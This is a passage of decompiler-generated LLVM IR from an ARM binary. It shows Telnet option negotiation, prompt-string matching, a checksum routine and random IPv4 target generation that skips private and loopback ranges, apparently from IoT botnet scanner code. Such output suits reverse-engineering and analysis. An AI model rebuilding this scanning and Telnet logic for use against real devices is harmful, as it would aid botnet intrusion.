  store i8 -4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a3ec

dec_label_pc_a36c:                                ; preds = %dec_label_pc_a34c
  %v2_a374 = load i8, i8* %v1_a2d0, align 1
  %v7_a378 = icmp eq i8 %v2_a374, 3
  %v7_a38c = icmp eq i8 %v2_a374, -3
  br i1 %v7_a378, label %dec_label_pc_a380, label %dec_label_pc_a3b8

dec_label_pc_a380:                                ; preds = %dec_label_pc_a36c
  br i1 %v7_a38c, label %dec_label_pc_a394, label %dec_label_pc_a3a0

dec_label_pc_a394:                                ; preds = %dec_label_pc_a380
  br label %dec_label_pc_a3a8

dec_label_pc_a3a0:                                ; preds = %dec_label_pc_a380
  br label %dec_label_pc_a3a8

dec_label_pc_a3a8:                                ; preds = %dec_label_pc_a394, %dec_label_pc_a3a0
  %storemerge = phi i8 [ -3, %dec_label_pc_a3a0 ], [ -5, %dec_label_pc_a394 ]
  store i8 %storemerge, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a3ec

dec_label_pc_a3b8:                                ; preds = %dec_label_pc_a36c
  br i1 %v7_a38c, label %dec_label_pc_a3cc, label %dec_label_pc_a3d8

dec_label_pc_a3cc:                                ; preds = %dec_label_pc_a3b8
  br label %dec_label_pc_a3e0

dec_label_pc_a3d8:                                ; preds = %dec_label_pc_a3b8
  br label %dec_label_pc_a3e0

dec_label_pc_a3e0:                                ; preds = %dec_label_pc_a3cc, %dec_label_pc_a3d8
  %storemerge4 = phi i8 [ -2, %dec_label_pc_a3d8 ], [ -4, %dec_label_pc_a3cc ]
  store i8 %storemerge4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a3ec

dec_label_pc_a3ec:                                ; preds = %dec_label_pc_a3a8, %dec_label_pc_a360, %dec_label_pc_a340, %dec_label_pc_a3e0
  %v4_a400 = call i32 @function_127fc(i32 %arg1, i32 %v2_a314, i32 1, i32 16384)
  %v1_a408 = add i32 %arg2, 2
  %v4_a41c = call i32 @function_127fc(i32 %arg1, i32 %v1_a408, i32 1, i32 16384)
  br label %dec_label_pc_a428

dec_label_pc_a428:                                ; preds = %dec_label_pc_a2f0, %dec_label_pc_a3ec, %dec_label_pc_a2ac
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-17, { 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_a428, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a3ec, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_a3e0, { 1, 0 }
  uselistorder label %dec_label_pc_a3a8, { 1, 0 }
}

define i32 @function_a43c(i32 %arg1) local_unnamed_addr {
dec_label_pc_a43c:
  store i32 %arg1, i32* @r0, align 4
  %v0_a45c = call i32 @function_11fd0()
  %v2_a4a4 = add i32 %v0_a45c, %arg1
  br label %dec_label_pc_a578

dec_label_pc_a47c:                                ; preds = %dec_label_pc_a504, %dec_label_pc_a4e0, %dec_label_pc_a4bc, %dec_label_pc_a498
  %v1_a480 = add nsw i32 %stack_var_-28.014, 1
  %v7_a494 = icmp sgt i32 %v0_a45c, %v1_a480
  br i1 %v7_a494, label %dec_label_pc_a498, label %dec_label_pc_a528

dec_label_pc_a498:                                ; preds = %dec_label_pc_a488.preheader, %dec_label_pc_a47c
  %stack_var_-28.014 = phi i32 [ %v1_a480, %dec_label_pc_a47c ], [ %stack_var_-28.1, %dec_label_pc_a488.preheader ]
  %v2_a4ac = sub i32 %v2_a4a4, %stack_var_-28.014
  %v1_a4b0 = inttoptr i32 %v2_a4ac to i8*
  %v2_a4b0 = load i8, i8* %v1_a4b0, align 1
  %v2_a4b4 = icmp eq i8 %v2_a4b0, 0
  br i1 %v2_a4b4, label %dec_label_pc_a47c, label %dec_label_pc_a4bc

dec_label_pc_a4bc:                                ; preds = %dec_label_pc_a498
  %v2_a4d4 = load i8, i8* %v1_a4b0, align 1
  %v7_a4d8 = icmp eq i8 %v2_a4d4, 32
  br i1 %v7_a4d8, label %dec_label_pc_a47c, label %dec_label_pc_a4e0

dec_label_pc_a4e0:                                ; preds = %dec_label_pc_a4bc
  %v2_a4f8 = load i8, i8* %v1_a4b0, align 1
  %v7_a4fc = icmp eq i8 %v2_a4f8, 13
  br i1 %v7_a4fc, label %dec_label_pc_a47c, label %dec_label_pc_a504

dec_label_pc_a504:                                ; preds = %dec_label_pc_a4e0
  %v2_a51c = load i8, i8* %v1_a4b0, align 1
  %v7_a520 = icmp eq i8 %v2_a51c, 10
  br i1 %v7_a520, label %dec_label_pc_a47c, label %dec_label_pc_a528

dec_label_pc_a528:                                ; preds = %dec_label_pc_a504, %dec_label_pc_a47c, %dec_label_pc_a488.preheader
  %stack_var_-28.0.lcssa = phi i32 [ %stack_var_-28.1, %dec_label_pc_a488.preheader ], [ %stack_var_-28.014, %dec_label_pc_a504 ], [ %v1_a480, %dec_label_pc_a47c ]
  %v2_a53c = sub i32 %v2_a4a4, %stack_var_-28.0.lcssa
  %v1_a540 = inttoptr i32 %v2_a53c to i8*
  %v2_a540 = load i8, i8* %v1_a540, align 1
  %v2_a550 = add i32 %storemerge3, ptrtoint ([6 x i8]* @global_var_19e6c.56 to i32)
  %v1_a554 = inttoptr i32 %v2_a550 to i8*
  %v2_a554 = load i8, i8* %v1_a554, align 1
  %v9_a558 = icmp eq i8 %v2_a540, %v2_a554
  %v1_a570 = add i32 %storemerge3, 1
  br i1 %v9_a558, label %dec_label_pc_a598, label %dec_label_pc_a578

dec_label_pc_a578:                                ; preds = %dec_label_pc_a528, %dec_label_pc_a43c
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_a43c ], [ %stack_var_-28.0.lcssa, %dec_label_pc_a528 ]
  %storemerge3 = phi i32 [ 0, %dec_label_pc_a43c ], [ %v1_a570, %dec_label_pc_a528 ]
  store i32 ptrtoint ([6 x i8]* @global_var_19e6c.56 to i32), i32* @r0, align 4
  %v0_a580 = call i32 @function_11fd0()
  %v3_a588 = icmp ult i32 %storemerge3, %v0_a580
  br i1 %v3_a588, label %dec_label_pc_a488.preheader, label %dec_label_pc_a598

dec_label_pc_a488.preheader:                      ; preds = %dec_label_pc_a578
  %v7_a49413 = icmp sgt i32 %v0_a45c, %stack_var_-28.1
  br i1 %v7_a49413, label %dec_label_pc_a498, label %dec_label_pc_a528

dec_label_pc_a598:                                ; preds = %dec_label_pc_a578, %dec_label_pc_a528
  %storemerge4 = phi i32 [ 1, %dec_label_pc_a528 ], [ 0, %dec_label_pc_a578 ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %stack_var_-28.1, { 2, 0, 1 }
  uselistorder i32 %stack_var_-28.0.lcssa, { 1, 0 }
  uselistorder i32 %v0_a45c, { 1, 2, 0 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_19e6c.56 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_a528, { 2, 0, 1 }
}

define i32 @function_a5b0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a5b0:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp17 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  %v3_a5b4 = load i32, i32* @fp, align 4
  store i32 %v3_a5b4, i32* %stack_var_-16, align 4
  %v13_a5b4 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_a604 = ptrtoint i32* %stack_var_-168 to i32
  %v3_a644 = udiv i32 %arg1, 32
  %v3_a650 = mul nuw nsw i32 %v3_a644, 4
  %v1_a668 = urem i32 %arg1, 32
  %v6_a670 = shl i32 1, %v1_a668
  %v1_a694 = add i32 %arg1, 1
  %v2_a69c = ptrtoint i32* %stack_var_-176 to i32
  %v2_a7bc = inttoptr i32 %arg2 to i8*
  %v2_a7d0 = icmp eq i32 %arg3, 0
  %v5_a820 = icmp sgt i32 %tmp29, 0
  %v2_a658 = add nsw i32 %v3_a650, -152
  %v2_a65c = add i32 %v2_a658, %v13_a5b4
  %v1_a660 = inttoptr i32 %v2_a65c to i32*
  br label %dec_label_pc_a7f8

dec_label_pc_a618.lr.ph:                          ; preds = %dec_label_pc_a80c, %dec_label_pc_a818
  br label %dec_label_pc_a618

dec_label_pc_a618:                                ; preds = %dec_label_pc_a618.lr.ph, %dec_label_pc_a618
  %storemerge27 = phi i32 [ 0, %dec_label_pc_a618.lr.ph ], [ %v1_a62c, %dec_label_pc_a618 ]
  %v5_a624 = mul nuw nsw i32 %storemerge27, 4
  %v6_a624 = add i32 %v5_a624, %v2_a604
  %v7_a624 = inttoptr i32 %v6_a624 to i32*
  store i32 0, i32* %v7_a624, align 4
  %v1_a62c = add nuw nsw i32 %storemerge27, 1
  %tmp30 = icmp ult i32 %v1_a62c, 32
  br i1 %tmp30, label %dec_label_pc_a618, label %dec_label_pc_a640

dec_label_pc_a640:                                ; preds = %dec_label_pc_a618
  %v2_a660 = load i32, i32* %v1_a660, align 4
  %v2_a674 = or i32 %v2_a660, %v6_a670
  store i32 %v2_a674, i32* %v1_a660, align 4
  %v5_a6b0 = call i32 @function_1059c(i32 %v1_a694, i32 %v2_a604, i32 0, i32 0, i32 %v2_a69c)
  %tmp31 = icmp slt i32 %v5_a6b0, 1
  br i1 %tmp31, label %dec_label_pc_a83c, label %dec_label_pc_a6c0

dec_label_pc_a6c0:                                ; preds = %dec_label_pc_a640
  %v2_a6cc = add i32 %stack_var_-40.0, %tmp9
  %v5_a6d0 = inttoptr i32 %v2_a6cc to i8*
  %v6_a6e4 = call i32 @function_127c4(i32 %arg1, i32 %v2_a6cc, i32 1, i32 0, i32 %v2_a6cc)
  %v7_a6f4 = icmp eq i32 %v6_a6e4, -1
  br i1 %v7_a6f4, label %dec_label_pc_a708, label %dec_label_pc_a6fc

dec_label_pc_a6fc:                                ; preds = %dec_label_pc_a6c0
  %v2_a700 = icmp eq i32 %v6_a6e4, 0
  br i1 %v2_a700, label %dec_label_pc_a708, label %dec_label_pc_a714

dec_label_pc_a708:                                ; preds = %dec_label_pc_a6fc, %dec_label_pc_a6c0
  br label %dec_label_pc_a844

dec_label_pc_a714:                                ; preds = %dec_label_pc_a6fc
  %v2_a71c = add i32 %v6_a6e4, %stack_var_-40.0
  %v2_a728 = load i8, i8* %v5_a6d0, align 1
  %v2_a72c = icmp eq i8 %v2_a728, -1
  br i1 %v2_a72c, label %dec_label_pc_a734, label %dec_label_pc_a7b4

dec_label_pc_a734:                                ; preds = %dec_label_pc_a714
  %v1_a738 = add i32 %v2_a6cc, 1
  %v5_a74c = call i32 @function_127c4(i32 %arg1, i32 %v1_a738, i32 2, i32 0, i32 %v2_a71c)
  %v7_a75c = icmp eq i32 %v5_a74c, -1
  br i1 %v7_a75c, label %dec_label_pc_a770, label %dec_label_pc_a764

dec_label_pc_a764:                                ; preds = %dec_label_pc_a734
  %v2_a768 = icmp eq i32 %v5_a74c, 0
  br i1 %v2_a768, label %dec_label_pc_a770, label %dec_label_pc_a77c

dec_label_pc_a770:                                ; preds = %dec_label_pc_a764, %dec_label_pc_a734
  br label %dec_label_pc_a844

dec_label_pc_a77c:                                ; preds = %dec_label_pc_a764
  %v2_a784 = add i32 %v5_a74c, %v2_a71c
  %v6_a798 = call i32 @function_a2ac(i32 %arg1, i32 %v2_a6cc, i32 3, i32 %v2_a784, i32 %v2_a784, i32 %v5_a74c)
  %v2_a7a0 = icmp eq i32 %v6_a798, 0
  br i1 %v2_a7a0, label %dec_label_pc_a7a8, label %dec_label_pc_a7f8

dec_label_pc_a7a8:                                ; preds = %dec_label_pc_a77c
  br label %dec_label_pc_a844

dec_label_pc_a7b4:                                ; preds = %dec_label_pc_a714
  %v3_a7bc = call i32 @function_12060(i32 %tmp9, i8* %v2_a7bc)
  %v2_a7c4 = icmp eq i32 %v3_a7bc, 0
  br i1 %v2_a7c4, label %dec_label_pc_a7cc, label %dec_label_pc_a830

dec_label_pc_a7cc:                                ; preds = %dec_label_pc_a7b4
  br i1 %v2_a7d0, label %dec_label_pc_a7f8, label %dec_label_pc_a7d8

dec_label_pc_a7d8:                                ; preds = %dec_label_pc_a7cc
  %v1_a7dc = call i32 @function_a43c(i32 %tmp9)
  %v2_a7e4 = icmp eq i32 %v1_a7dc, 0
  br i1 %v2_a7e4, label %dec_label_pc_a7f8, label %dec_label_pc_a830

dec_label_pc_a7f8:                                ; preds = %dec_label_pc_a77c, %dec_label_pc_a7d8, %dec_label_pc_a7cc, %dec_label_pc_a5b0
  %stack_var_-40.0 = phi i32 [ %tmp17, %dec_label_pc_a5b0 ], [ %v2_a784, %dec_label_pc_a77c ], [ %v2_a71c, %dec_label_pc_a7cc ], [ %v2_a71c, %dec_label_pc_a7d8 ]
  %v1_a7fc = add i32 %stack_var_-40.0, 2
  %v6_a808 = icmp slt i32 %v1_a7fc, %tmp
  br i1 %v6_a808, label %dec_label_pc_a80c, label %dec_label_pc_a83c

dec_label_pc_a80c:                                ; preds = %dec_label_pc_a7f8
  %v3_a80c = load i32, i32* %stack_var_-176, align 4
  %v5_a814 = icmp sgt i32 %v3_a80c, 0
  br i1 %v5_a814, label %dec_label_pc_a618.lr.ph, label %dec_label_pc_a818

dec_label_pc_a818:                                ; preds = %dec_label_pc_a80c
  br i1 %v5_a820, label %dec_label_pc_a618.lr.ph, label %dec_label_pc_a83c

dec_label_pc_a830:                                ; preds = %dec_label_pc_a7b4, %dec_label_pc_a7d8
  br label %dec_label_pc_a844

dec_label_pc_a83c:                                ; preds = %dec_label_pc_a640, %dec_label_pc_a818, %dec_label_pc_a7f8
  br label %dec_label_pc_a844

dec_label_pc_a844:                                ; preds = %dec_label_pc_a830, %dec_label_pc_a7a8, %dec_label_pc_a770, %dec_label_pc_a708, %dec_label_pc_a83c
  %stack_var_-196.0 = phi i32 [ 0, %dec_label_pc_a83c ], [ 1, %dec_label_pc_a830 ], [ 0, %dec_label_pc_a708 ], [ 0, %dec_label_pc_a770 ], [ 0, %dec_label_pc_a7a8 ]
  %v2_a850 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_a850, i32* @fp, align 4
  ret i32 %stack_var_-196.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 2, 1, 0 }
  uselistorder i32 %v5_a74c, { 2, 1, 3, 0 }
  uselistorder i32 %v6_a6e4, { 1, 2, 0 }
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v2_a604, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i32 %tmp9, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_127c4, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_a844, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_a83c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a830, { 1, 0 }
  uselistorder label %dec_label_pc_a7f8, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_a618, { 1, 0 }
  uselistorder label %dec_label_pc_a618.lr.ph, { 1, 0 }
}

define i32 @function_a858(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a858:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_a85c = load i32, i32* @fp, align 4
  %v10_a85c = load i32, i32* @lr, align 4
  store i32 43108, i32* %stack_var_-4, align 4
  %v2_a860 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a860, i32* @fp, align 4
  %v0_a870 = call i32 @function_13a28()
  %v2_a88c = sdiv i32 %v0_a870, 51
  %tmp37 = mul i32 %v2_a88c, -253
  %v2_a8ac = add i32 %tmp37, %v0_a870
  %v6_a8bc = trunc i32 %v2_a8ac to i8
  %v0_a8c0 = call i32 @function_13a28()
  %v2_a8dc = sdiv i32 %v0_a8c0, 51
  %tmp38 = mul i32 %v2_a8dc, -255
  %v2_a8f4 = add i32 %tmp38, %v0_a8c0
  %v1_a904 = trunc i32 %v2_a8f4 to i8
  %v0_a908 = call i32 @function_13a28()
  %v2_a924 = sdiv i32 %v0_a908, 51
  %tmp39 = mul i32 %v2_a924, -255
  %v2_a93c = add i32 %tmp39, %v0_a908
  %v1_a94c = trunc i32 %v2_a93c to i8
  %v0_a950 = call i32 @function_13a28()
  %v2_a96c = sdiv i32 %v0_a950, 51
  %tmp = mul i32 %v2_a96c, -255
  %v2_a984 = add i32 %v0_a950, %tmp
  br label %dec_label_pc_aac4

dec_label_pc_a99c:                                ; preds = %dec_label_pc_aaf4, %dec_label_pc_ab14, %dec_label_pc_ab08, %dec_label_pc_aad0, %dec_label_pc_aac4
  %v0_a99c = call i32 @function_13a28()
  %v2_a9b8 = sdiv i32 %v0_a99c, 51
  %tmp40 = mul i32 %v2_a9b8, -253
  %v2_a9d8 = add i32 %tmp40, %v0_a99c
  %v6_a9e8 = trunc i32 %v2_a9d8 to i8
  %v0_a9ec = call i32 @function_13a28()
  %v2_aa08 = sdiv i32 %v0_a9ec, 51
  %tmp41 = mul i32 %v2_aa08, -255
  %v2_aa20 = add i32 %tmp41, %v0_a9ec
  %v1_aa30 = trunc i32 %v2_aa20 to i8
  %v0_aa34 = call i32 @function_13a28()
  %v2_aa50 = sdiv i32 %v0_aa34, 51
  %tmp42 = mul i32 %v2_aa50, -255
  %v2_aa68 = add i32 %tmp42, %v0_aa34
  %v1_aa78 = trunc i32 %v2_aa68 to i8
  %v0_aa7c = call i32 @function_13a28()
  %v2_aa98 = sdiv i32 %v0_aa7c, 51
  %tmp43 = mul i32 %v2_aa98, -255
  %v2_aab0 = add i32 %v0_aa7c, %tmp43
  br label %dec_label_pc_aac4

dec_label_pc_aac4:                                ; preds = %dec_label_pc_a858, %dec_label_pc_a99c
  %storemerge = phi i32 [ %v2_a984, %dec_label_pc_a858 ], [ %v2_aab0, %dec_label_pc_a99c ]
  %stack_var_-18.0 = phi i8 [ %v1_a94c, %dec_label_pc_a858 ], [ %v1_aa78, %dec_label_pc_a99c ]
  %stack_var_-19.0 = phi i8 [ %v1_a904, %dec_label_pc_a858 ], [ %v1_aa30, %dec_label_pc_a99c ]
  %stack_var_-20.0 = phi i8 [ %v6_a8bc, %dec_label_pc_a858 ], [ %v6_a9e8, %dec_label_pc_a99c ]
  %v4_aac4 = sext i8 %stack_var_-20.0 to i32
  %v1_aac8 = icmp slt i8 %stack_var_-20.0, 0
  %v2_aac8 = icmp eq i8 %stack_var_-20.0, 0
  br i1 %v2_aac8, label %dec_label_pc_a99c, label %dec_label_pc_aad0

dec_label_pc_aad0:                                ; preds = %dec_label_pc_aac4
  %v7_aad4 = icmp eq i8 %stack_var_-20.0, 10
  br i1 %v7_aad4, label %dec_label_pc_a99c, label %dec_label_pc_aadc

dec_label_pc_aadc:                                ; preds = %dec_label_pc_aad0
  %v7_aae0 = icmp eq i8 %stack_var_-20.0, 100
  br i1 %v7_aae0, label %dec_label_pc_aae8, label %dec_label_pc_ab08

dec_label_pc_aae8:                                ; preds = %dec_label_pc_aadc
  %tmp44 = icmp ult i8 %stack_var_-19.0, 64
  br i1 %tmp44, label %dec_label_pc_ab08, label %dec_label_pc_aaf4

dec_label_pc_aaf4:                                ; preds = %dec_label_pc_aae8
  %v1_ab00 = icmp slt i8 %stack_var_-19.0, 0
  br i1 %v1_ab00, label %dec_label_pc_ab08, label %dec_label_pc_a99c

dec_label_pc_ab08:                                ; preds = %dec_label_pc_aaf4, %dec_label_pc_aadc, %dec_label_pc_aae8
  %v7_ab0c = icmp eq i8 %stack_var_-20.0, 127
  br i1 %v7_ab0c, label %dec_label_pc_a99c, label %dec_label_pc_ab14

dec_label_pc_ab14:                                ; preds = %dec_label_pc_ab08
  br i1 %v1_aac8, label %dec_label_pc_a99c, label %dec_label_pc_ac28

dec_label_pc_ac28:                                ; preds = %dec_label_pc_ab14
  %v2_ac28 = ptrtoint i32* %stack_var_-36 to i32
  store i32 0, i32* %stack_var_-36, align 4
  store i32 %v4_aac4, i32* @lr, align 4
  %v4_ac64 = zext i8 %stack_var_-19.0 to i32
  %v4_ac74 = urem i32 %storemerge, 256
  %v6_ac90 = sext i8 %stack_var_-18.0 to i32
  %v8_ac90 = call i32 @function_8e90(i32 %v2_ac28, i32 ptrtoint ([12 x i8]* @global_var_19e74.60 to i32), i32 %v4_aac4, i32 %v4_ac64, i32 %v6_ac90, i32 %v4_ac74)
  store i32 %v2_ac28, i32* @r0, align 4
  %v1_ac9c = call i32 @function_126e8(i32 %v2_ac28)
  store i32 %v3_a85c, i32* @fp, align 4
  store i32 %v10_a85c, i32* @lr, align 4
  ret i32 %v1_ac9c

; uselistorder directives
  uselistorder i32 %v2_ac28, { 2, 1, 0 }
  uselistorder i8 %stack_var_-20.0, { 0, 1, 2, 5, 4, 3 }
  uselistorder i8 %stack_var_-19.0, { 1, 2, 0 }
  uselistorder i32 %v0_aa34, { 1, 0 }
  uselistorder i32 %v0_a9ec, { 1, 0 }
  uselistorder i32 %v0_a99c, { 1, 0 }
  uselistorder i32 %v0_a908, { 1, 0 }
  uselistorder i32 %v0_a8c0, { 1, 0 }
  uselistorder i32 %v0_a870, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_ab08, { 0, 2, 1 }
  uselistorder label %dec_label_pc_aac4, { 1, 0 }
  uselistorder label %dec_label_pc_a99c, { 1, 2, 0, 3, 4 }
}

define i32 @function_acb4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_acb4:
  %v0_acb4 = load i1, i1* @cpsr_c, align 1
  %v1_acb4 = load i1, i1* @cpsr_z, align 1
  %v2_acb4 = xor i1 %v1_acb4, true
  %v3_acb4 = and i1 %v0_acb4, %v2_acb4
  br i1 %v3_acb4, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_acb4
  %v5_acb4 = load i32, i32* @sb, align 4
  %v6_acb4 = and i32 %v5_acb4, 67108864
  %v7_acb4 = icmp ne i32 %v6_acb4, 0
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_acb4, %bb
  %v0_acb8 = phi i1 [ %v0_acb4, %dec_label_pc_acb4 ], [ %v7_acb4, %bb ]
  %v3_acb8 = and i1 %v0_acb8, %v2_acb4
  br i1 %v3_acb8, label %bb3, label %bb4

bb3:                                              ; preds = %bb2
  br i1 %v1_acb4, label %bb5, label %bb6

bb4:                                              ; preds = %bb2
  br i1 %v1_acb4, label %bb5, label %bb6

bb5:                                              ; preds = %bb3, %bb4
  br label %bb6

bb6:                                              ; preds = %bb3, %bb4, %bb5
  ret i32 %arg1

; uselistorder directives
  uselistorder i1 %v2_acb4, { 1, 0 }
  uselistorder i1 %v1_acb4, { 2, 1, 0 }
  uselistorder label %bb6, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_acc0(i32 %arg1) local_unnamed_addr {
dec_label_pc_acc0:
  %v3_acc4 = load i32, i32* @fp, align 4
  %v2_acd8 = load i32, i32* @global_var_29770.62, align 4
  %v1_ace0 = call i32 @function_12620(i32 %v2_acd8)
  %v2_acec = and i32 %v1_ace0, %arg1
  %v0_acf4 = call i32 @function_8440()
  %v1_ad00 = sub i32 -1, %arg1
  %v2_ad04 = and i32 %v0_acf4, %v1_ad00
  %v2_ad0c = xor i32 %v2_ad04, %v2_acec
  store i32 %v3_acc4, i32* @fp, align 4
  ret i32 %v2_ad0c
}

define i32 @function_ad24(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_ad24:
  %v8_ad989 = icmp sgt i32 %arg2, 1
  br i1 %v8_ad989, label %dec_label_pc_ad50, label %dec_label_pc_ad9c

dec_label_pc_ad50:                                ; preds = %dec_label_pc_ad24, %dec_label_pc_ad50
  %v2_ad64 = phi i32 [ %v2_ad68, %dec_label_pc_ad50 ], [ 0, %dec_label_pc_ad24 ]
  %stack_var_-44.012 = phi i32 [ %v5_ad6c, %dec_label_pc_ad50 ], [ 0, %dec_label_pc_ad24 ]
  %stack_var_-40.011 = phi i32 [ %v1_ad88, %dec_label_pc_ad50 ], [ %arg2, %dec_label_pc_ad24 ]
  %stack_var_-36.010 = phi i16* [ %v5_ad80, %dec_label_pc_ad50 ], [ %arg1, %dec_label_pc_ad24 ]
  %v4_ad50 = ptrtoint i16* %stack_var_-36.010 to i32
  %v2_ad54 = load i16, i16* %stack_var_-36.010, align 2
  %v3_ad54 = zext i16 %v2_ad54 to i32
  %v2_ad68 = add i32 %v3_ad54, %v2_ad64
  %v3_ad68 = icmp ult i32 %v2_ad68, %v2_ad64
  %v4_ad6c = zext i1 %v3_ad68 to i32
  %v5_ad6c = add i32 %v4_ad6c, %stack_var_-44.012
  %v1_ad7c = add i32 %v4_ad50, 2
  %v5_ad80 = inttoptr i32 %v1_ad7c to i16*
  %v1_ad88 = add nsw i32 %stack_var_-40.011, -2
  %v8_ad98 = icmp sgt i32 %v1_ad88, 1
  br i1 %v8_ad98, label %dec_label_pc_ad50, label %dec_label_pc_ad90.dec_label_pc_ad9c_crit_edge

dec_label_pc_ad90.dec_label_pc_ad9c_crit_edge:    ; preds = %dec_label_pc_ad50
  br label %dec_label_pc_ad9c

dec_label_pc_ad9c:                                ; preds = %dec_label_pc_ad90.dec_label_pc_ad9c_crit_edge, %dec_label_pc_ad24
  %v2_adbc = phi i32 [ %v2_ad68, %dec_label_pc_ad90.dec_label_pc_ad9c_crit_edge ], [ 0, %dec_label_pc_ad24 ]
  %stack_var_-36.0.lcssa = phi i16* [ %v5_ad80, %dec_label_pc_ad90.dec_label_pc_ad9c_crit_edge ], [ %arg1, %dec_label_pc_ad24 ]
  %stack_var_-44.0.lcssa = phi i32 [ %v5_ad6c, %dec_label_pc_ad90.dec_label_pc_ad9c_crit_edge ], [ 0, %dec_label_pc_ad24 ]
  %v7_ad94.lcssa.in = phi i32 [ %v1_ad88, %dec_label_pc_ad90.dec_label_pc_ad9c_crit_edge ], [ %arg2, %dec_label_pc_ad24 ]
  %v7_ad94.lcssa = icmp eq i32 %v7_ad94.lcssa.in, 1
  br i1 %v7_ad94.lcssa, label %dec_label_pc_ada8, label %dec_label_pc_ae24.preheader

dec_label_pc_ada8:                                ; preds = %dec_label_pc_ad9c
  %v1_adac = bitcast i16* %stack_var_-36.0.lcssa to i8*
  %v2_adac = load i8, i8* %v1_adac, align 1
  %v3_adac = zext i8 %v2_adac to i32
  %v2_adc0 = add i32 %v3_adac, %v2_adbc
  %v3_adc0 = icmp ult i32 %v2_adc0, %v2_adbc
  %v4_adc4 = zext i1 %v3_adc0 to i32
  %v5_adc4 = add i32 %v4_adc4, %stack_var_-44.0.lcssa
  br label %dec_label_pc_ae24.preheader

dec_label_pc_ae24.preheader:                      ; preds = %dec_label_pc_ada8, %dec_label_pc_ad9c
  %v3_ae50.ph = phi i32 [ %v2_adbc, %dec_label_pc_ad9c ], [ %v2_adc0, %dec_label_pc_ada8 ]
  %stack_var_-44.1.ph = phi i32 [ %stack_var_-44.0.lcssa, %dec_label_pc_ad9c ], [ %v5_adc4, %dec_label_pc_ada8 ]
  %v3_ae2837 = mul i32 %stack_var_-44.1.ph, 65536
  %v3_ae3038 = udiv i32 %v3_ae50.ph, 65536
  %v2_ae3439 = or i32 %v3_ae2837, %v3_ae3038
  %v3_ae3c40 = udiv i32 %stack_var_-44.1.ph, 65536
  %v2_ae4441 = or i32 %v2_ae3439, %v3_ae3c40
  %v2_ae4842 = icmp eq i32 %v2_ae4441, 0
  br i1 %v2_ae4842, label %dec_label_pc_ae50, label %dec_label_pc_add4

dec_label_pc_add4:                                ; preds = %dec_label_pc_ae24.preheader, %dec_label_pc_add4
  %v3_ae3c45 = phi i32 [ %v3_ae3c, %dec_label_pc_add4 ], [ %v3_ae3c40, %dec_label_pc_ae24.preheader ]
  %v2_ae3444 = phi i32 [ %v2_ae34, %dec_label_pc_add4 ], [ %v2_ae3439, %dec_label_pc_ae24.preheader ]
  %v3_ae5043 = phi i32 [ %v2_ae14, %dec_label_pc_add4 ], [ %v3_ae50.ph, %dec_label_pc_ae24.preheader ]
  %v2_ade8 = urem i32 %v3_ae5043, 65536
  %v2_ae14 = add i32 %v2_ae3444, %v2_ade8
  %v3_ae14 = icmp ult i32 %v2_ae14, %v2_ade8
  %v4_ae18 = zext i1 %v3_ae14 to i32
  %v5_ae18 = add nuw nsw i32 %v4_ae18, %v3_ae3c45
  %v3_ae28 = mul i32 %v5_ae18, 65536
  %v3_ae30 = udiv i32 %v2_ae14, 65536
  %v2_ae34 = or i32 %v3_ae28, %v3_ae30
  %v3_ae3c = udiv i32 %v5_ae18, 65536
  %v2_ae44 = or i32 %v2_ae34, %v3_ae3c
  %v2_ae48 = icmp eq i32 %v2_ae44, 0
  br i1 %v2_ae48, label %dec_label_pc_ae24.dec_label_pc_ae50_crit_edge, label %dec_label_pc_add4

dec_label_pc_ae24.dec_label_pc_ae50_crit_edge:    ; preds = %dec_label_pc_add4
  br label %dec_label_pc_ae50

dec_label_pc_ae50:                                ; preds = %dec_label_pc_ae24.dec_label_pc_ae50_crit_edge, %dec_label_pc_ae24.preheader
  %v3_ae50.lcssa = phi i32 [ %v2_ae14, %dec_label_pc_ae24.dec_label_pc_ae50_crit_edge ], [ %v3_ae50.ph, %dec_label_pc_ae24.preheader ]
  %v1_ae5c = urem i32 %v3_ae50.lcssa, 65536
  %v3_ae64 = xor i32 %v1_ae5c, 65535
  ret i32 %v3_ae64

